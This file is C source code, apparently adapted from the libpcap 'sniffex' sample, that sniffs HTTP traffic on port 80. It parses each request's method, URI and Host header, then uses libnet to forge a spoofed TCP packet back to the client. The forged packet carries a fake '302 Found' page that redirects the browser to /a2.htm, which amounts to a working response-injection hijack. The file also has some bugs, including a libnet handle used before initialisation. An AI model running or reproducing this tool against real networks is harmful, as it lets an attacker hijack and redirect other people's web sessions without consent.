#define APP_NAME    "sniffex"
#define APP_DESC    "Sniffer example using libpcap"
#define APP_COPYRIGHT    "Copyright (c) 2005"
#define APP_DISCLAIMER    "THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM."

#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#define __USE_BSD
#include <netinet/ip.h>
#define __FAVOR_BSD
#include <netinet/tcp.h>
#include <netinet/ether.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <netdb.h>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>

#include <stdio.h>
#include <stdlib.h>

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14


#define iscrlf(p) (*p == '\r' && *(p + 1) == '\n')
#define notcrlf(p) (*p != '\r' && *(p + 1) != '\n')

#define notend(p) (*p != '\0')
#define end(p) (*p == '\0')

//#define IP_HL(ip) (((ip)->ip_hl) & 0x0f)
//#define IP_V(ip) (((ip)->ip_hl) >> 4)
//#define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
/* Ethernet addresses are 6 bytes */
//#define ETHER_ADDR_LEN    6

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

int
libnet_send(struct ether_header *ether, struct ip *iphdr, struct tcphdr *tcphdr, const u_char *payload);

/*
 * dissect/print packet
 */
void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

    static int count = 1; /* packet counter */    
    /* declare pointers to packet headers */
    //const struct sniff_ethernet *ethernet; /* The ethernet header [1] */
    //const struct sniff_ip *ip; /* The IP header */
    //const struct sniff_tcp *tcp; /* The TCP header */

    struct ether_header *ether = NULL;    
    struct ip *iphdr = NULL;
    struct tcphdr *tcphdr = NULL;
    struct pcap_pkthdr pkthdr;

    int size_ip = 20;
    int size_tcp;
    int size_payload;    
    //u_char *payload; /* Packet payload */
    const char *payload;

    printf("\nPacket number %d:\n", count);
    count++;

    /* define ethernet header */
    ether = (struct ether_header *)(packet);
    iphdr = (struct ip *)(packet + 14);
    tcphdr = (struct tcphdr *)(packet + 14 + 20);

    size_tcp = tcphdr->th_off * 4;  
    size_payload = ntohs(iphdr->ip_len) - (size_ip + size_tcp);
/*
    printf("-----------------------------------------\n");
    printf("ACK: %u\n", ntohl(tcphdr->th_ack));
    printf("SEQ: %u\n", ntohl(tcphdr->th_seq));
    printf("DST IP: %s:%d\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
    printf("SRC IP: %s:%d\n", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
    printf(" ip_ttl: %d\n", iphdr->ip_ttl);
    printf(" ip_id:  %d|OK:%d|OK:%d\n", iphdr->ip_id, htons(iphdr->ip_id), ntohs(iphdr->ip_id));
    printf(" ip_off: %d|%d|%d\n", iphdr->ip_off, htons(iphdr->ip_off), ntohs(iphdr->ip_off));
    printf(" ip_len: %d|OK:%d|OK:%d\n", iphdr->ip_len, htons(iphdr->ip_len), ntohs(iphdr->ip_len));
    printf(" ip_tos: %d|%d|%d\n", iphdr->ip_tos, htons(iphdr->ip_tos), ntohs(iphdr->ip_tos));
*/
    printf(" th_win: %d|OK: %d|OK: %d\n", tcphdr->th_win, htons(tcphdr->th_win), ntohs(tcphdr->th_win));
    printf(" th_sum: %d|%d|%d\n", tcphdr->th_sum, htons(tcphdr->th_sum), ntohs(tcphdr->th_sum));
    printf(" th_off: %d|%d|%d\n", tcphdr->th_off, htons(tcphdr->th_off), ntohs(tcphdr->th_off));
    printf("size_payload: %d\n", size_payload);
    printf("-----------------------------------------\n");

    //size_tcp = TH_OFF(tcphdr)*4;

    if (size_tcp < 20) {
        printf(" * Invalid TCP header length: %u bytes\n", size_tcp);
        return;
    }
    payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
    /* compute tcp payload (segment) size */
    size_payload = ntohs(iphdr->ip_len) - (size_ip + size_tcp);

    /*
     * Print payload data; it might be binary, so don't just
     * treat it as a string.
     */
    if (size_payload > 0) {
        printf(" Payload (%d bytes):\n", size_payload);
        printf("%s", payload);
        if (ntohs(tcphdr->th_dport) == 80)
        {
            const u_char new_payload[2048] = {0};
			//u_char *p = payload;
            const char * p = payload;
			while (notend(p) && ! isspace(*p) ) p++;

    		if ( end(p) || iscrlf(p) ) {
        		// set error
        		return NULL;
    		}
   
    		const char * RequestMethod = payload;
    		int RequestMethodlen = p - payload;
            
			while (isspace(*p) && notcrlf(p) && notend(p) ) p++;
			const char *RequestURI = p;
			while (!isspace(*p) && notcrlf(p) && notend(p) ) p++;
			int RequestURIlen = p - RequestURI;
            
            while ( notcrlf(p) && notend(p) ) p++;
            int nflag = 1, RequestHostlen = 0;
            const char * RequestHost = NULL;
            while (notend(p)) {
                while ( notcrlf(p) && notend(p) ) p++;
                p+=2;
                RequestHost = p;
                while (!isspace(*p) && notcrlf(p) && notend(p) ) p++; 
			    RequestHostlen = p - RequestHost;
                
                if(strncmp("Host:", RequestHost, RequestHostlen) == 0) 
                {
                    while (isspace(*p) && notcrlf(p) && notend(p) ) p++;
                    RequestHost = p;
                    while (!isspace(*p) && notcrlf(p) && notend(p) ) p++; 
			        RequestHostlen = p - RequestHost;
                    printf("--> RequestHost: %.*s\n", RequestHostlen, RequestHost); 
                    break;
                }                
                nflag ++;                
                if (nflag > 10) break;
            }
            
                          
			printf("--> RequestMethod: %.*s\n", RequestMethodlen, RequestMethod);			
			printf("--> RequestURI: %.*s\n", RequestURIlen, RequestURI);
            printf("--> RequestHost: %.*s\n", RequestHostlen, RequestHost);      
            const u_char * change_uri = "/a2.htm";            
	                    
            
            u_char *htmlcontent = "<html>\r\n<head><title>302 Found</title></head>\r\n<body bgcolor=\"white\">\r\n<center><h1>302 Found</h1></center>\r\n<hr><center>pr-nginx_1-0-257_BRANCH Branch.Time : Tue Jan  5 14:24:59 CST 2016</center>\r\n</body>\r\n</html>\r\n";
            u_char *htmlhead = "HTTP/1.1 302 Moved Temporarily\r\nContent-Type: text/html\r\nContent-Length: %d\r\nConnection: Keep-Alive\r\n";
      
            sprintf(new_payload, htmlhead, strlen(htmlcontent));
            sprintf(new_payload, "%sLocation: http://%.*s/a2.htm\r\n\r\n%s", new_payload, RequestHostlen, RequestHost, htmlcontent);
            
            printf("4----------htmlhead----------------\r\n");
            printf("contentlen: %d\r\n", strlen(htmlcontent));
            printf("%s", htmlhead);
            printf("5----------new_payload---------------\r\n");
            printf("%s", new_payload);
            printf("6-----------------------------------\r\n");
/*      
#if 0      
            sprintf(new_payload, "%.*s %s%s", RequestMethodlen, RequestMethod, change_uri, p);
            printf("--> new_payload: len: %d | %s\n", strlen(new_payload), new_payload);            
            //libnet_send(ether, iphdr, tcphdr, size_payload, payload);
            libnet_send(ether, iphdr, tcphdr, strlen(new_payload), new_payload);
#endif 
*/ 
            if(strncmp(change_uri, RequestURI, strlen(change_uri)) != 0)
            {
                //sprintf(new_payload, "%.*s %s%s", RequestMethodlen, RequestMethod, change_uri, p);
                //printf("--> new_payload: len: %d\n%s\n", strlen(new_payload), new_payload);            
                //libnet_send(ether, iphdr, tcphdr, size_payload, payload);
                //printf("LIBNET_IPV4_H:%d LIBNET_TCP_H:%d size_payload:%d\n", LIBNET_IPV4_H, LIBNET_TCP_H, strlen(new_payload));
                libnet_send(ether, iphdr, tcphdr, new_payload);
            }
            else
            {
                printf("skip owner cap resend.\n");
            }
          
        }
    }

    return;
}


int
libnet_send(struct ether_header *ether, struct ip *iphdr, struct tcphdr *tcphdr, const u_char *payload)
{
    char *dev = "enp0s8";
    libnet_t *handle; /* Libnet句柄 */
    int packet_size; /* 构造的数据包大小 */

    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* 各层build函数返回值 */
    u_short proto = IPPROTO_TCP; /* 传输层协议 */
    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */    

    /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(handle, inet_ntoa(iphdr->ip_dst), LIBNET_RESOLVE);
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(handle, inet_ntoa(iphdr->ip_src), LIBNET_RESOLVE);
	
	
	
    /* 初始化Libnet */
    if ( (handle = libnet_init(LIBNET_LINK, dev, error)) == NULL ) {
        printf("libnet_init failure\n");
        return (-1);
    };
        
    int size_payload = strlen(payload); /* 计算负载内容的长度 */

    tcp_tag = libnet_build_tcp(
                ntohs(tcphdr->th_dport),  /* 源端口 */
                ntohs(tcphdr->th_sport),  /* 目的端口 */
                ntohl(tcphdr->th_ack),    /* 确认号 */                
                ntohl(tcphdr->th_seq) + ntohs(iphdr->ip_len) - 40 - 12,    /* 序列号 */
                TH_PUSH | TH_ACK,         /* Control flags */
                260,                     /* 窗口尺寸 */
                0,                        /* 校验和,0为自动计算 */
                0,                        /* 紧急指针 */
                LIBNET_TCP_H + size_payload, /* 长度 */
                payload,                  /* 负载内容 */
                size_payload,             /* 负载内容长度 */
                handle,                   /* libnet句柄 */
                0                         /* 新建包 */
    );
    
/*    libnet_build_tcp(
        ntohs(tcp_head->dest), 
        ntohs(tcp_head->source), 
        ntohl(tcp_head->ack_seq),
        ntohl(tcp_head->seq) + ntohs(ip_head->tot_len) - 40,
        TH_ACK | TH_PUSH | TH_FIN, 
        4096, 
        0, 
        0, 
        20 + SIZEHTTPHEAD,
        httphead, 
        SIZEHTTPHEAD, 
        libnet, 
        0);*/
   
    if (tcp_tag == -1) {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };
    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + size_payload, /* IP协议块的总长,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
        IP_DF, /* frag 片偏移 */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
        proto, /* 上层协议 */
        0, /* 校验和，此时为0，表示由Libnet自动计算 */
        dst_ip, /* 源IP地址,网络序 */
        src_ip, /* 目标IP地址,网络序 */
        NULL, /* 负载内容或为NULL */
        0, /* 负载内容的大小*/
        handle, /* Libnet句柄 */
        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
/*
    libnet_build_ipv4(
        40 + SIZEHTTPHEAD, 
        0, 
        0, 
        0x4000, 
        63 //ttl,
        IPPROTO_TCP, 
        0, 
        ip_head->daddr, 
        ip_head->saddr, 
        0, 
        0, 
        libnet, 
        0);
    */
    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        ether->ether_shost, /* 以太网目的地址 */
        ether->ether_dhost, /* 以太网源地址 */
        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
        NULL, /* 负载，这里为空 */ 
        0, /* 负载大小 */
        handle, /* Libnet句柄 */
        0 /* 协议块标记，0表示构造一个新的 */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };

    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
    libnet_destroy(handle); /* 释放句柄 */
    printf("send packet complete, packet_size:%d", packet_size);
    return (0);
}    



int main(int argc, char **argv)
{
    char *dev = NULL;        /* capture device name */
    char errbuf[PCAP_ERRBUF_SIZE];    /* error buffer */
    pcap_t *handle;        /* packet capture handle */

    //char filter_exp[] = "dst 202.114.85.31 and tcp";   
    char filter_exp[] = "dst port 80";    /* filter expression [3] */
    struct bpf_program fp;        /* compiled filter program (expression) */
    bpf_u_int32 mask;        /* subnet mask */
    bpf_u_int32 net;        /* ip */
    int num_packets = 10;        /* number of packets to capture */

    //print_app_banner();

    /* check for capture device name on command-line */
    if (argc == 2) {
        dev = argv[1];
    }
    else if (argc > 2) {
        fprintf(stderr, "error: unrecognized command-line options\n\n");
        //print_app_usage();
        exit(EXIT_FAILURE);
    }
    else {
        /* find a capture device if not specified on command-line */
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL) {
            fprintf(stderr, "Couldn't find default device: %s\n",
                errbuf);
            exit(EXIT_FAILURE);
        }
    }

    /* get network number and mask associated with capture device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }

    /* print capture info */
    printf("Device: %s\n", dev);
    printf("Number of packets: %d\n", num_packets);
    printf("Filter expression: %s\n", filter_exp);

    /* open capture device */
    handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    /* make sure we're capturing on an Ethernet device [2] */
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "%s is not an Ethernet\n", dev);
        exit(EXIT_FAILURE);
    }

    /* compile the filter expression */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n",
        filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    /* apply the compiled filter */
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n",
        filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    /* now we can set our callback function */
    pcap_loop(handle, num_packets, got_packet, NULL);

    /* cleanup */
    pcap_freecode(&fp);
    pcap_close(handle);

    printf("\nCapture complete.\n");

    return 0;
}
